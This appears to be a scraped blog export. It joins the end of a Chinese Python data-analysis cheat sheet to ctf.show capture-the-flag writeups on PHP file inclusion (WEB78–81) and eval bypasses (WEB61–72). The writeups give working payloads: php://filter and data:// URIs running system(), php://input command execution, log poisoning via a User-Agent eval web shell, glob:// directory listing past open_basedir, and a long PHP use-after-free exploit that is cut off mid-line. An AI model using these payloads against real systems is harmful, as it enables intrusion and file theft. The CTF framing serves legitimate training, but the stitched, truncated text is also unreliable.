元素类型（int32、float64…） a.dtype ndim 维度数 a.ndim size 元素总数 a.size nbytes 占用字节数 a.nbytes itemsize 每个元素占字节 a.itemsize 多维切片范式\n1 2 a[:, s:e:step] # 多行部分列 a[i, j] # 单个元素 2.1.4 逻辑运算 \u0026amp; 条件筛 1 2 3 mask = (a \u0026gt;= 5) # 布尔矩阵 a2 = a[mask] # ⚠️ mask 必须是 bool 同尺寸 sel = np.where(mask, x, y) # 三参缺一不可 ⚠️ 逻辑运算符要用 ***\\**\\*\u0026amp;\\*\\**\\*** / ***\\**\\*|\\*\\**\\***，并加括号\n1 (a \u0026gt; 1) \u0026amp; (a \u0026lt; 5) 2.1.5 广播 (Broadcasting) 场景 例子 ⚠️ 注意 标量 × 数组 a * 3 不同形状数组 (3,1) × (1,4) → (3,4) 数值陷阱 0**0 得到 1 1/0 → inf，可 np.isinf 检测 向量/矩阵乘法\n1 2 np.dot(a, b) # 点乘 np.cross(a, b) # 叉乘 2.1.6 统计 \u0026amp; 聚合 函数 作用 a.sum(axis) / a.mean(axis) 求和 / 均值 a.min / a.max 最小 / 最大 a.var / a.std 方差 / 标准差 轴解释：axis=0 ⇢ 按行聚合（看成“列方向”）；axis=1 ⇢ 按列聚合。\n2.1.7 拷贝语义 方法 数据是否复制 用途 b = a.view() 否 轻量别名，共享底层数据 b = a.copy() 是 深拷贝，互不影响 2.1.8 删除 \u0026amp; 去重 操作 示例 ⚠️ 坑点 去重 np.unique(a) 删除 np.delete(a, idx, axis=None) ① axis=None → 扁平化后删② 删单元会破坏矩阵形状，结果一维 ⚡ 速记清单 **import numpy as np**（别写成 import np）。 随机数组：random.random(shape) 只能形状元组，random.randn 直接写维度。 逻辑运算记得 **\u0026amp;**** / ***\\*|\\**** + 括号**。 np.where(cond, x, y) 三个参数不可少。 转置 a.T，改形 a.reshape(new_shape) 不改变元素总数。 view() 共享数据，copy() 独立数据。 0**0 == 1；1/0 → inf。 np.delete 的 axis 表示在哪个轴上删索引，写错会降维。 2.2 Pandas 库概览 一句话记住： Pandas = “带标签的一维 Series + 二维 DataFrame” + 大量 SQL 风格操作\n1 import pandas as pd # ⚠️ 别写成 import pandas as np 2.2.1 读入数据 函数 主要参数 ⚠️ 坑点 pd.read_csv(filepath, sep=',', header='infer', names=…, index_col=…, skiprows=…) sep 分隔符header: 行号或 Nonenames: 自指定列名index_col: 哪列做索引skiprows: 跳过前几行 **header=True** 写法非法！ 应写 header=0 或 header=None 其他：read_excel, read_sql… 此处不展开 1 2 df = pd.read_csv(\u0026#34;data.csv\u0026#34;, sep=\u0026#34;,\u0026#34;, index_col=0) df.head(4) # 预览前 4 行 基本信息速查 1 2 3 4 5 df.shape # (行, 列) df.columns # Index([...]) df.index # RangeIndex / DatetimeIndex … df.dtypes # 每列类型 df.size # 元素总数 2.2.2 核心数据结构 结构 创建方式 说明 Series pd.Series(list_or_dict) ⚠️ 首字母大写；若用字典，索引跟随字典键 DataFrame pd.DataFrame(dict_or_ndarray) 单行视作 Series，但 df[['name']] 仍返回 DataFrame 2.2.2.1 Series 访问 1 2 3 s[\u0026#39;label\u0026#39;] # 单元素 s[3:8] # 切片 s[[\u0026#39;a\u0026#39;,\u0026#39;b\u0026#39;]] # 传列表仍得到 Series 2.2.2.2 DataFrame 访问 方式 示例 返回 按列 df['col'] Series 多列 df[['c1','c2']] DataFrame 重排列顺序 df[['c3','c1','c2']] New DataFrame **.loc** df.loc['row', 'col'] 标签取值 **.iloc** df.iloc[0, 1] 纯整数位置 **.at** / **.iat** 单元素极速定位 df.at['r','c'] ⚠️ **.iloc** 不支持布尔 / label，只接受整数；切片右端 包含。\n2.2.3 查询（五大套路） **loc** — 最推荐：逻辑、切片、函数一把抓\n1 2 3 df.loc[(df[\u0026#39;name\u0026#39;]!=\u0026#39;NaN\u0026#39;) \u0026amp; (df[\u0026#39;age\u0026#39;]\u0026gt;18)] df.loc[\u0026#39;20240101\u0026#39;:\u0026#39;20240131\u0026#39;] df.loc[lambda d: d[\u0026#39;score\u0026#39;] \u0026gt; 90] **iloc**：纯数字行列\n**where**：保持原形，条件不满足处填 NaN\n**query**：SQL 风格字符串，列名可直接写\n1 df.query(\u0026#34;age \u0026gt; 18 and city == \u0026#39;Beijing\u0026#39;\u0026#34;) 布尔索引：mask = (df['x']\u0026gt;0); df[mask]\n2.2.4 新增 / 修改列 方法 示例 直接赋值 df['new'] = df['old'] * 1.2 **loc** 写列 df.loc[:, 'flag'] = (df['score']\u0026gt;60) str 处理 df['city'] = df['city'].str.replace('市','') 类型转换 df['age'] = df['age'].astype(int) **apply(func, axis)** 行级: axis=1；列级: axis=0df['sum'] = df.apply(lambda r: r.a+r.b, axis=1) 多列 apply 返回 pd.Series 并 join 2.2.5 统计与描述 1 2 3 4 5 df.describe() # 数值列：均值、四分位… df[\u0026#39;col\u0026#39;].mean() df[\u0026#39;col\u0026#39;].max() df[\u0026#39;col\u0026#39;].min() df[\u0026#39;col\u0026#39;].value_counts() # 类别计数 相关矩阵 示例 协方差 df[['x','y']].cov() 相关系数 df[['x','y']].corr() 2.2.6 缺失值处理 函数 关键参数 说明 isnull / notnull - 返回布尔同维度 dropna(axis=0, how='any', inplace=False) axis: 0 行 / 1 列how: 'any' 或 'all' 删除包含空值的行/列 fillna(value=…, method=…, axis=0, inplace=False) value: 单值或列名→值字典method: 'ffill' / 'bfill' 前向 / 后向填充 2.2.7 排序 \u0026amp; 重排 1 df.sort_values(by=[\u0026#39;score\u0026#39;,\u0026#39;age\u0026#39;], ascending=[False,True], inplace=True) ⚡ 速记清单 **read_csv** 参数：**sep**+**header**+**names**+**index_col**；header=True 写法会炸！ Series/DataFrame 首字母大写。 **loc** 万能：标签、逻辑、函数，且可同时赋值。 .iloc 只认整数位；切片右端包含。 新列可直接 df['new'] = …；行级计算记得 axis=1。 缺失值：dropna vs fillna，method='ffill'/'bfill'。 value_counts() 计类别；describe() 看全貌。 sort_values 支持多列 \u0026amp; 不同升降序：ascending=[…]。 2.3 Matplotlib – pyplot 速查 核心流程\nplt.figure() 创建画布 plt.plot()／plt.scatter() 绘图 设置标题、标签、网格、图例 plt.savefig() + plt.show() 输出 2.3.1 画布 1 2 3 import matplotlib.pyplot as plt plt.figure(figsize=(6, 4), dpi=100) # 6×4 英寸，100 DPI 若不调用 plt.figure()，会默认创建一个新画布。 fig = plt.gcf() 可以获取当前 Figure 对象。 2.3.2 直线图：plt.plot 1 2 3 4 plt.plot(x, y, fmt, linewidth=2, alpha=0.8, label=\u0026#34;Series-A\u0026#34;) **fmt**** = 颜色 + 标记 + 线型**（顺序不限，可缺省其中任意部分）。 组件 代码 说明 颜色 b g r c m y k w blue/green/red/cyan/magenta/yellow/black/white 标记 . o v ^ \u0026lt; \u0026gt; s * + x D point/circle/tri_down/tri_up/…/square/star/plus/x/diamond 线型 - / -- / -. / : / '' solid/dashed/dash-dot/dotted/none 1 2 3 plt.plot(x, y, \u0026#34;ro--\u0026#34;) # red circle + dashed line plt.plot(x2, y2, \u0026#34;g^:\u0026#34;) # green triangle_up + dotted line plt.plot(x3, y3, \u0026#34;k*\u0026#34;) # black star, no line ⚠️\n只要线条、默认蓝色：\u0026quot;-\u0026quot; 等同于 \u0026quot;b-\u0026quot; 只要标记、无线条：\u0026quot;o\u0026quot; 等同于 \u0026quot;bo\u0026quot; tri是三角形的意思 2.3.3 散点图：plt.scatter 1 2 3 4 5 6 7 plt.scatter(x, y, s=40, # 点面积 c=\u0026#34;tomato\u0026#34;, # 颜色 marker=\u0026#34;^\u0026#34;, # 标记 edgecolors=\u0026#34;k\u0026#34;, # 边框色 alpha=0.7, label=\u0026#34;Points\u0026#34;) 若要按数值映射颜色，可传入数组给 c= 并指定 cmap。 2.3.4 注释元素 1 2 3 4 5 plt.title(\u0026#34;Main Title\u0026#34;, fontsize=14) plt.xlabel(\u0026#34;X-Label\u0026#34;) plt.ylabel(\u0026#34;Y-Label\u0026#34;) plt.grid(True, linestyle=\u0026#34;:\u0026#34;, alpha=0.3) plt.legend(loc=\u0026#34;best\u0026#34;) # 显示所有带 label 的图例 2.3.5 保存与显示 1 2 plt.savefig(\u0026#34;figure.png\u0026#34;, dpi=300, bbox_inches=\u0026#34;tight\u0026#34;) plt.show() # 最后调用，否则在某些环境会清空当前画布 ⚡ 速记清单 **fmt**** (***\\*plt.plot\\****)** = 颜色 + 标记 + 线型，任意组合、省略。 直线图 用 plt.plot(x,y, fmt)；散点图 用 plt.scatter(x,y, s, c, marker). label + plt.legend() → 自动生成图例（线对应关系）。 调用 plt.grid(True) 加网格；透明度由 alpha 控制。 先 savefig（dpi≥150），再 show()。 0x3 常用算法与技巧 下面汇总一些在编程竞赛与日常脚本中常见又好用的小技巧，涵盖输入输出、字符串处理、循环套路、常用库、取余妙用和文件操作。复制即可记入笔记。\n3.1 输入／输出 技巧 批量读入多变量\n1 2 # ⚠️ eval 存在安全风险，仅限竞赛或受信数据 a, b, c = eval(input()) # 输入格式如：1,2,3 分割并转类型\n1 2 3 # 正确写法 a, b, c = map(int, input().split()) # 输入：1 2 3 → 全转为 int # 同理：map(float, …)、map(str, …) 字符间隔插入\n1 2 s = input() # e.g. \u0026#34;12345\u0026#34; print(\u0026#34; \u0026#34;.join(s)) # 输出：1 2 3 4 5 文本倒置／整数反转\n1 2 3 4 5 s = input() print(s[::-1]) # 字符串倒置 n = int(input()) rev = int(str(n)[::-1]) # 整数反转 3.2 字符串与编码 ASCII 码互转\n操作 示例 字符 → 码点 ord('A') # 65 码点 → 字符 chr(9731) # '☃' 常见范围\n范围 码点区间 0–9 48 – 57 A–Z 65 – 90 a–z 97 – 122 切片技巧\n1 2 3 4 s = \u0026#34;abcdefg\u0026#34; s[2:5] # 从索引 2 到 4，含头不含尾 s[:-1] # 除去最后一位 s[-1] # 仅最后一位 首字母／单词大写\n1 2 s.title() # 每个单词首字母大写 s.capitalize() # 仅第一个字符大写 空白字符处理\n1 2 3 s.strip() # 去除首尾空白 s.lstrip() # 去除左侧空白 s.rstrip() # 去除右侧空白 常用判别 / 转换\n方法 说明 s.isdigit() 全部为数字 s.isalpha() 全部为字母 s.isnumeric() 数字字符（含中文数字） s.upper() 全部转大写 s.endswith(x) 是否以 x 结尾 s.startswith(x) 是否以 x 开头 s.count(sub) 子串出现次数 3.3 循环 常见模板 每行打印 n 个数\n1 2 3 4 5 6 nums = list(range(1, 21)) n = 5 for i, v in enumerate(nums, 1): print(v, end=\u0026#39; \u0026#39;) if i % n == 0: print() 简易素数判断（$O(\\sqrt n)$）\n1 2 3 4 5 6 7 8 def is_prime(x): if x \u0026lt; 2: return False i = 2 while i * i \u0026lt;= x: if x % i == 0: return False i += 1 return True 乘法表\n1 2 3 4 5 n = 9 for i in range(1, n+1): for j in range(1, i+1): print(f\u0026#34;{j}×{i}={i*j}\u0026#34;, end=\u0026#39;\\t\u0026#39;) print() 斐波那契\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # 指定项数 def fib(n): a, b = 0, 1 for _ in range(n): print(a, end=\u0026#39; \u0026#39;) a, b = b, a + b print() # 指定最大值 def fib_upto(maxv): a, b = 0, 1 while a \u0026lt;= maxv: print(a, end=\u0026#39; \u0026#39;) a, b = b, a + b print() 3.4 取余 (%) 的妙用 凯撒密码（字符串循环移位）\n1 2 3 4 5 6 7 8 def caesar(s, shift): res = [] for ch in s: if \u0026#39;a\u0026#39; \u0026lt;= ch \u0026lt;= \u0026#39;z\u0026#39;: res.append(chr((ord(ch)-97+shift)%26 + 97)) else: res.append(ch) return \u0026#39;\u0026#39;.join(res) 星期循环\n1 2 days = [\u0026#34;Mon\u0026#34;,\u0026#34;Tue\u0026#34;,\u0026#34;Wed\u0026#34;,\u0026#34;Thu\u0026#34;,\u0026#34;Fri\u0026#34;,\u0026#34;Sat\u0026#34;,\u0026#34;Sun\u0026#34;] idx = (idx + k) % 7 3.5 快速文件操作：with 语句 1 2 3 4 with open(\u0026#34;file.txt\u0026#34;, \u0026#34;r\u0026#34;, encoding=\u0026#34;utf-8\u0026#34;) as f: for line in f: print(line.rstrip()) # 无需手动 close() Tips：\n常见算法尽量封装成函数，主流程清晰； 注重边界条件（0,1 的特殊处理）； 保持代码简洁，适时注释。 3.6 排序 列表：lst.sort() → 原地升序；sorted(lst, reverse=True) → 新列表\n字典：按值排序：\n1 items = sorted(d.items(), key=lambda kv: kv[1], reverse=True) 3.7 常用标准库 3.7.1 datetime 1 2 3 4 import datetime today = datetime.date.today() year, month, day = today.year, today.month, today.day weekday = today.weekday() # 0=Mon … 6=Sun 闰年判断\n1 2 def is_leap(y): return (y%4==0 and y%100!=0) or (y%400==0) 3.7.2 random 1 2 3 4 import random random.seed(42) r1 = random.randint(1, 10) # 包括两端 r2 = random.random() # [0,1) 3.8 常见英文单词：月份 \u0026amp; 星期 月份（Months） 序号 全名 缩写 1 January Jan 2 February Feb 3 March Mar 4 April Apr 5 May May 6 June Jun 7 July Jul 8 August Aug 9 September Sep 10 October Oct 11 November Nov 12 December Dec 星期（Weekdays） 序号 全名 缩写 1 Monday Mon 2 Tuesday Tue 3 Wednesday Wed 4 Thursday Thu 5 Friday Fri 6 Saturday Sat 7 Sunday Sun ⚠️ Tip：\nPython 中可用 datetime 模块获取当前月/星期，并通过以上列表做映射。 处理日期字符串时，经常需要识别或输出这些全称/缩写。 ","date":"2025-05-17T00:00:00Z","permalink":"https://blog.kingbatsoft.top/p/python_data_analysis/","title":"丁薇🉐Python数据分析课程小册"},{"content":"WEB78 1 2 3 4 5 6 if(isset($_GET[\u0026#39;file\u0026#39;])){ $file = $_GET[\u0026#39;file\u0026#39;]; include($file); }else{ highlight_file(__FILE__); } ?file=php://filter/convert.base64-encode/resource=flag.php\n直接秒杀\nWEB79 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-16 11:10:14 # @Last Modified by: h1xa # @Last Modified time: 2020-09-16 11:12:38 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET[\u0026#39;file\u0026#39;])){ $file = $_GET[\u0026#39;file\u0026#39;]; $file = str_replace(\u0026#34;php\u0026#34;, \u0026#34;???\u0026#34;, $file); include($file); }else{ highlight_file(__FILE__); } 这次把php替换成???，用刚才那个就不行了，首先php://这个协议会被替换，然后后面flag.php会被替换成flag.???，怎么办呢\n可以使用?file=data://text/plain,\u003c?=system('tac flag.php');?\u003e直接得到flag，也可以用base64的形式?file=data://text/plain;base64,PD89c3lzdGVtKCd0YWMgZmxhZy5waHAnKTs%2FPg%3D%3D\n这里base64需要url编码一下不然会失败。\n看别人wp发现还可以用\n1 2 3 POST /?file=Php://input HTTP/1.1 \u0026lt;?Php system(\u0026#34;ls\u0026#34;);?\u0026gt; 这样进行命令执行\nWEB80 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-16 11:25:09 # @Last Modified by: h1xa # @Last Modified time: 2020-09-16 11:26:29 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET[\u0026#39;file\u0026#39;])){ $file = $_GET[\u0026#39;file\u0026#39;]; $file = str_replace(\u0026#34;php\u0026#34;, \u0026#34;???\u0026#34;, $file); $file = str_replace(\u0026#34;data\u0026#34;, \u0026#34;???\u0026#34;, $file); include($file); }else{ highlight_file(__FILE__); } 这下把data过滤了，可以用上一题post的方法，ls发现这次flag放在f10g.php里了\n方法1 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 GET /?file=Php://input HTTP/1.1 Host: 4fe5398d-5f2c-407f-ad24-455e9ed43dd6.challenge.ctf.show Sec-Ch-Ua: \u0026#34;Chromium\u0026#34;;v=\u0026#34;133\u0026#34;, \u0026#34;Not(A:Brand\u0026#34;;v=\u0026#34;99\u0026#34; Sec-Ch-Ua-Mobile: ?0 Sec-Ch-Ua-Platform: \u0026#34;Windows\u0026#34; Accept-Language: zh-CN,zh;q=0.9 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate, br Priority: u=0, i Connection: keep-alive Content-Length: 33 \u0026lt;?Php system(\u0026#34;cat fl0g.php\u0026#34;);?\u0026gt; HTTP/1.1 200 OK Server: nginx/1.20.1 Date: Tue, 13 May 2025 09:31:50 GMT Content-Type: text/html; charset=UTF-8 Connection: keep-alive X-Powered-By: PHP/7.3.11 Access-Control-Allow-Methods: GET,POST,PUT,DELETE,OPTIONS Access-Control-Allow-Credentials: true Access-Control-Expose-Headers: Content-Type,Cookies,Aaa,Date,Server,Content-Length,Connection Access-Control-Allow-Headers: DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization,x-auth-token,Cookies,Aaa,Date,Server,Content-Length,Connection Access-Control-Max-Age: 1728000 Content-Length: 278 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-16 11:24:37 # @Last Modified by: h1xa # @Last Modified time: 2020-09-16 11:25:00 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ $flag=\u0026#34;ctfshow{900c07e3-3b7f-4b21-ba7c-e19a8f1d74e8}\u0026#34;; 方法2 这里还可以用ua头写一句话，ua里加入\u0026lt;?php eval($_GET[2]);?\u0026gt;，然后/?file=/var/log/nginx/access.log\u0026amp;2=system('ls /var/www/html');phpinfo();\n可以看到f10g.php，再直接?file=/var/log/nginx/access.log\u0026amp;2=system('tac /var/www/html/fl0g.php');phpinfo();即可。\nWEB81 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-16 11:25:09 # @Last Modified by: h1xa # @Last Modified time: 2020-09-16 15:51:31 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET[\u0026#39;file\u0026#39;])){ $file = $_GET[\u0026#39;file\u0026#39;]; $file = str_replace(\u0026#34;php\u0026#34;, \u0026#34;???\u0026#34;, $file); $file = str_replace(\u0026#34;data\u0026#34;, \u0026#34;???\u0026#34;, $file); $file = str_replace(\u0026#34;:\u0026#34;, \u0026#34;???\u0026#34;, $file); include($file); }else{ highlight_file(__FILE__); } 这次直接把冒号过滤了，直接上一道题那个payload秒杀?file=/var/log/nginx/access.log\u0026amp;2=system('tac /var/www/html/fl0g.php');phpinfo();\n","date":"2025-05-13T00:00:00Z","permalink":"https://blog.kingbatsoft.top/p/ctfshow_web_fileinclude_write_up/","title":"CTF_show Web 文件包含writeup WEB78-WEB81"},{"content":"WEB61-WEB65 1 2 3 4 if(isset($_POST[\u0026#39;c\u0026#39;])){ $c= $_POST[\u0026#39;c\u0026#39;]; eval($c); } 这里直接给了eval函数，但是测试了一下system函数被禁用了，不过有很多很多方法可以进行绕过\n1 2 3 4 5 6 7 var_dump() #打印变量相关信息 print_r() #打印多个变量的值，可以打印复杂类型变量的值，如array file_get_contents() highlight_file() show_source() #highlight_file()的别名 readfile() scandir() #用于打印目录下的文件 这里给一个例子：\n1 2 print_r(scandir(\u0026#39;.\u0026#39;)); #打印当前目录文件名字 show_source(\u0026#39;flag.php\u0026#39;); #对文件进行语法高亮显示。 从web58-web65都可以使用highlight_file()绕过，这里不多叙述了。\nWEB66-67 仍然是这个\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: Lazzaro # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-07 22:02:47 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ // 你们在炫技吗？ if(isset($_POST[\u0026#39;c\u0026#39;])){ $c= $_POST[\u0026#39;c\u0026#39;]; eval($c); }else{ highlight_file(__FILE__); } 但是这次用highlight_file(\u0026quot;flag.php\u0026quot;);不行了\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-07 19:40:53 # @Last Modified by: h1xa # @Last Modified time: 2020-09-07 19:41:00 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ $flag=\u0026#34;秀秀得了,这次不在这里\u0026#34;; 这次不在这里了，使用print_r(scandir('.')); 使用c=print_r(scandir('../../../../'));查看根目录发现flag.txt，继续用c=highlight_file(\u0026quot;../../../flag.txt\u0026quot;);，得到flagctfshow{93f9123f-aa36-45c4-8f55-0b3a64c46775}\nWEB68 尝试include一下index.php，但是提示：Fatal error: Allowed memory size of 134217728 bytes exhausted (tried to allocate 262144 bytes) in /var/www/html/index.php(17) : eval()'d code on line 1，直接尝试include(\u0026quot;/flag.txt\u0026quot;);得到flag\n另外看wp还有一种思路：c=var_dump(scandir(\u0026rsquo;/\u0026rsquo;));可以扫描到目录\nWEB69 var_dump这里也被禁用了，可以使用c=echo json_encode(scandir(\u0026quot;/\u0026quot;));或者c=var_export(scandir(\u0026quot;/\u0026quot;));扫描目录， 然后直接require()或者include()得到flag。\nWEB70 同上一关，另外读取文件还可以使用echo json_encode(glob(\u0026quot;/flag.*\u0026quot;));\nWEB71 这里发现用函数输出的都是???，发现有个附件，下载打开瞅瞅\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: Lazzaro # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-07 22:02:47 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); ini_set(\u0026#39;display_errors\u0026#39;, 0); // 你们在炫技吗？ if(isset($_POST[\u0026#39;c\u0026#39;])){ $c= $_POST[\u0026#39;c\u0026#39;]; eval($c); $s = ob_get_contents(); ob_end_clean(); echo preg_replace(\u0026#34;/[0-9]|[a-z]/i\u0026#34;,\u0026#34;?\u0026#34;,$s); }else{ highlight_file(__FILE__); } ?\u0026gt; 你要上天吗？ 原来是把输出文本全部替换成?了，这里尝试使用die函数提前终止执行c=echo json_encode(scandir(\u0026quot;/\u0026quot;));die(\u0026quot;1\u0026quot;);，成功输出 [\u0026quot;.\u0026quot;,\u0026quot;..\u0026quot;,\u0026quot;.dockerenv\u0026quot;,\u0026quot;bin\u0026quot;,\u0026quot;dev\u0026quot;,\u0026quot;etc\u0026quot;,\u0026quot;flag.txt\u0026quot;,\u0026quot;home\u0026quot;,\u0026quot;lib\u0026quot;,\u0026quot;media\u0026quot;,\u0026quot;mnt\u0026quot;,\u0026quot;opt\u0026quot;,\u0026quot;proc\u0026quot;,\u0026quot;root\u0026quot;,\u0026quot;run\u0026quot;,\u0026quot;sbin\u0026quot;,\u0026quot;srv\u0026quot;,\u0026quot;sys\u0026quot;,\u0026quot;tmp\u0026quot;,\u0026quot;usr\u0026quot;,\u0026quot;var\u0026quot;]1 然后使用include(\u0026ldquo;flag.txt\u0026rdquo;);die(\u0026ldquo;1\u0026rdquo;);获取到了flag。\n看别人的wp发现还可以提前送出缓冲区的内容，在劫持输出缓冲区之前就把缓冲区送出，可以用的函数有：\n1 2 ob_flush(); ob_end_flush(); WEB72 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: Lazzaro # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-07 22:02:47 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); ini_set(\u0026#39;display_errors\u0026#39;, 0); // 你们在炫技吗？ if(isset($_POST[\u0026#39;c\u0026#39;])){ $c= $_POST[\u0026#39;c\u0026#39;]; eval($c); $s = ob_get_contents(); ob_end_clean(); echo preg_replace(\u0026#34;/[0-9]|[a-z]/i\u0026#34;,\u0026#34;?\u0026#34;,$s); }else{ highlight_file(__FILE__); } ?\u0026gt; 你要上天吗？ 这道题测试发现新增了限制目录，现在访问不了根目录了 使用c=var_export(scandir(\u0026quot;.\u0026quot;));die();可以正常回显： array ( 0 =\u0026gt; \u0026lsquo;.\u0026rsquo;, 1 =\u0026gt; \u0026lsquo;..\u0026rsquo;, 2 =\u0026gt; \u0026lsquo;flag.php\u0026rsquo;, 3 =\u0026gt; \u0026lsquo;index.php\u0026rsquo;, ) 但是c=var_export(scandir(\u0026quot;/\u0026quot;));die();就会报错，open_basedir限制了目录，/var/www/html/以外的目录都被禁止访问了。 这道题没什么思路了，看了提示是用glob伪协议读取的目录，然后提示使用uaf脚本进行命令执行\nQ：UAF不是也可以ls /吗\nA：别问，问就是学习伪协议\n1 2 3 4 5 6 7 c=?\u0026gt;\u0026lt;?php $a=new DirectoryIterator(\u0026#34;glob:///*\u0026#34;); foreach($a as $f) {echo($f-\u0026gt;__toString().\u0026#39; \u0026#39;); } e xit(0); ?\u0026gt; UAF:\nc=function ctfshow($cmd) { global $abc, $helper, $backtrace; class Vuln { public $a; public function __destruct() { global $backtrace; unset($this-\u0026gt;a); $backtrace = (new Exception)-\u0026gt;getTrace(); if(!isset($backtrace[1][\u0026#39;args\u0026#39;])) { $backtrace = debug_backtrace(); } } } class Helper { public $a, $b, $c, $d; } function str2ptr(\u0026amp;$str, $p = 0, $s = 8) { $address = 0; for($j = $s-1; $j \u0026gt;= 0; $j--) { $address \u0026lt;\u0026lt;= 8; $address |= ord($str[$p+$j]); } return $address; } function ptr2str($ptr, $m = 8) { $out = \u0026#34;\u0026#34;; for ($i=0; $i \u0026lt; $m; $i++) { $out .= sprintf(\u0026#34;%c\u0026#34;,($ptr \u0026amp; 0xff)); $ptr \u0026gt;\u0026gt;= 8; } return $out; } function write(\u0026amp;$str, $p, $v, $n = 8) { $i = 0; for($i = 0; $i \u0026lt; $n; $i++) { $str[$p + $i] = sprintf(\u0026#34;%c\u0026#34;,($v \u0026amp; 0xff)); $v \u0026gt;\u0026gt;= 8; } } function leak($addr, $p = 0, $s = 8) { global $abc, $helper; write($abc, 0x68, $addr + $p - 0x10); $leak = strlen($helper-\u0026gt;a); if($s != 8) { $leak %= 2 \u0026lt;\u0026lt; ($s * 8) - 1; } return $leak; } function parse_elf($base) { $e_type = leak($base, 0x10, 2); $e_phoff = leak($base, 0x20); $e_phentsize = leak($base, 0x36, 2); $e_phnum = leak($base, 0x38, 2); for($i = 0; $i \u0026lt; $e_phnum; $i++) { $header = $base + $e_phoff + $i * $e_phentsize; $p_type = leak($header, 0, 4); $p_flags = leak($header, 4, 4); $p_vaddr = leak($header, 0x10); $p_memsz = leak($header, 0x28); if($p_type == 1 \u0026amp;\u0026amp; $p_flags == 6) { $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr; $data_size = $p_memsz; } else if($p_type == 1 \u0026amp;\u0026amp; $p_flags == 5) { $text_size = $p_memsz; } } if(!$data_addr || !$text_size || !$data_size) return false; return [$data_addr, $text_size, $data_size]; } function get_basic_funcs($base, $elf) { list($data_addr, $text_size, $data_size) = $elf; for($i = 0; $i \u0026lt; $data_size / 8; $i++) { $leak = leak($data_addr, $i * 8); if($leak - $base \u0026gt; 0 \u0026amp;\u0026amp; $leak - $base \u0026lt; $data_addr - $base) { $deref = leak($leak); if($deref != 0x746e6174736e6f63) continue; } else continue; $leak = leak($data_addr, ($i + 4) * 8); if($leak - $base \u0026gt; 0 \u0026amp;\u0026amp; $leak - $base \u0026lt; $data_addr - $base) { $deref = leak($leak); if($deref != 0x786568326e6962) continue; } else continue; return $data_addr + $i * 8; } } function get_binary_base($binary_leak) { $base = 0; $start = $binary_leak \u0026amp; 0xfffffffffffff000; for($i = 0; $i \u0026lt; 0x1000; $i++) { $addr = $start - 0x1000 * $i; $leak = leak($addr, 0, 7); if($leak == 0x10102464c457f) { return $addr; } } } function get_system($basic_funcs) { $addr = $basic_funcs; do { $f_entry = leak($addr); $f_name = leak($f_entry, 0, 6); if($f_name == 0x6d6574737973) { return leak($addr + 8); } $addr += 0x20; } while($f_entry != 0); return false; } function trigger_uaf($arg) { $arg = str_shuffle(\u0026#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#39;); $vuln = new Vuln(); $vuln-\u0026gt;a = $arg; } if(stristr(PHP_OS, \u0026#39;WIN\u0026#39;)) { die(\u0026#39;This PoC is for *nix systems only.\u0026#39;); } $n_alloc = 10; $contiguous = []; for($i = 0; $i \u0026lt; $n_alloc; $i++) $contiguous[] = str_shuffle(\u0026#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#39;); trigger_uaf(\u0026#39;x\u0026#39;); $abc = $backtrace[1][\u0026#39;args\u0026#39;][0]; $helper = new Helper; $helper-\u0026gt;b = function ($x) { }; if(strlen($abc) == 79 || strlen($abc) == 0) { die(\u0026#34;UAF failed\u0026#34;); } $closure_handlers = str2ptr($abc, 0); $php_heap = str2ptr($abc, 0x58); $abc_addr 